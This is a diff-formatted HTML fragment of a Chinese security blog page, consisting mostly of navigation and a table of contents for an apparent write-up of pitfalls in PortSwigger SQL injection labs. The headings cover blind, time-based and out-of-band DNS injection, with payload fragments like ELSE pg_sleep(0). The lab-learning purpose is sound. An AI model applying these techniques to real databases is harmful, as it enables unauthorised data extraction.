+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../audit/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8-PHP%E4%B8%8EJava/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    代码审计入门
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../blog/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    WP 博客
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_3" id="__nav_3_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    WP 博客
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_2" id="__nav_3_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    归档
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    归档
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../blog/archive/2026/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    2026
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_3" id="__nav_3_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    分类
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    分类
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../blog/category/portswigger/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    PortSwigger
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../blog/category/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    代码执行
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../blog/category/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    命令注入
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../blog/category/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    文件上传
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../files/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    工具字典
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    工具字典
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#1-302" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 1：把 302 当成「失败了」
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="坑 1：把 302 当成「失败了」">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        现象
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        原因
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        正确做法
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 2：用了全角中文逗号 ，
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="坑 2：用了全角中文逗号 ，">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        现象
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        原因
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        正确做法
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 3：不理解 ' 到底在干什么
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="坑 3：不理解 &#39; 到底在干什么">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        现象
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        原因
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        正确做法
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4payload" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 4：payload 结尾加了 ;
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="坑 4：payload 结尾加了 ;">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_10" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        现象
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_11" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        原因
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_12" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        正确做法
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5-" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 5：-- 后面没空格 / 忘了加注释
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="坑 5：-- 后面没空格 / 忘了加注释">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_13" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        现象
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_14" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        原因
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_15" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        正确做法
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#6-z" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 6：用 &gt;'z' 做测试
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="坑 6：用 &gt;&#39;z&#39; 做测试">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_16" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        现象
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_17" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        原因
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_18" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        正确做法
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#7from-dual-users" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 7：FROM dual 里引用 users 的列
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="坑 7：FROM dual 里引用 users 的列">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_19" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        现象
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_20" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        原因
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_21" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        正确做法
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#8" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 8：括号不配对
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="坑 8：括号不配对">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_22" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        现象
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_23" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        原因
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_24" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        正确做法
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#9else-a" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 9：else a' 少了开引号
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="坑 9：else a&#39; 少了开引号">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_25" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        现象
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_26" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        原因
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_27" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        正确做法
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#10oracle-case" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 10（Oracle 专属）：CASE 分支类型不一致
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="坑 10（Oracle 专属）：CASE 分支类型不一致">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_28" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        现象
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_29" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        原因
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_30" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        正确做法
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#11-500-500" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 11：分不清「语法错误的 500」和「条件成立的 500」
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="坑 11：分不清「语法错误的 500」和「条件成立的 500」">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_31" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        现象
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_32" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        原因
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_33" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        正确做法
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#12lab-504" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 12：lab 过期了，返回 504
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="坑 12：lab 过期了，返回 504">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_34" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        现象
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_35" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        原因
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_36" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        正确做法
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#13substring-substr" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 13：SUBSTRING 和 SUBSTR 混用
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="坑 13：SUBSTRING 和 SUBSTR 混用">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_37" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        现象
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_38" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        原因
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_39" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        正确做法
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#14cookie" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 14：Cookie 里的分隔符和空格
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="坑 14：Cookie 里的分隔符和空格">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_40" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        现象
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_41" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        原因
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_42" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        正确做法
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#15" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 15：盲注逐字符手工试，慢到不可用
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="坑 15：盲注逐字符手工试，慢到不可用">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_43" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        现象
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_44" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        原因
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_45" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        正确做法
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#16-mssql-if-postgresql" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 16：把 MSSQL 的 IF 用在 PostgreSQL 上
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="坑 16：把 MSSQL 的 IF 用在 PostgreSQL 上">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_46" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        现象
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_47" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        原因
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_48" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        正确做法
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#17else-pg_sleep0-else-0" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 17：ELSE pg_sleep(0) 写成了 ELSE 0
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="坑 17：ELSE pg_sleep(0) 写成了 ELSE 0">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_49" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        现象
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_50" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        原因
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_51" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        正确做法
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#18cookie" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 18：Cookie 里的 ; 没编码
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="坑 18：Cookie 里的 ; 没编码">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_52" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        现象
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_53" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        原因
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_54" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        正确做法
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#19" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 19：时间盲注用绝对阈值
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="坑 19：时间盲注用绝对阈值">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_55" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        现象
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_56" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        原因
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_57" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        正确做法
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#20" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 20：字符集不含大写字母,静默出错
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="坑 20：字符集不含大写字母,静默出错">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_58" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        现象
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_59" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        原因
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_60" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        正确做法
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#21" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 21：时间盲注开了并发
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="坑 21：时间盲注开了并发">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_61" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        现象
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_62" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        原因
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_63" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        正确做法
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#22" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 22：跑完不验证,不知道错在哪
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="坑 22：跑完不验证,不知道错在哪">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_64" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        现象
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_65" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        正确做法
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#23-and-cast" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 23：可见错误里 AND 直接接 CAST
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="坑 23：可见错误里 AND 直接接 CAST">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_66" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        现象
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_67" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        原因
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_68" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        正确做法
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#24payload" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 24：payload 被截断,却以为是语法错
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="坑 24：payload 被截断,却以为是语法错">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_69" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        现象
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_70" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        原因
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_71" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        正确做法
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#25oob-payload" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 25：OOB payload 里 % 没编码
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="坑 25：OOB payload 里 % 没编码">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_72" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        现象
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_73" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        原因
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_74" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        正确做法
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#26oob" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 26：OOB 平台在国内打不开
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="坑 26：OOB 平台在国内打不开">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_75" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        现象
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_76" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        原因
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_77" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        正确做法
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#27-oob-portswigger" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 27：以为换个 OOB 平台就能绕开 PortSwigger 的限制
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="坑 27：以为换个 OOB 平台就能绕开 PortSwigger 的限制">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_78" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        现象
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_79" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        原因
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_80" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        正确做法
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#28dns" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 28：DNS 标签超长 / 含非法字符
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="坑 28：DNS 标签超长 / 含非法字符">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_81" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        现象
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
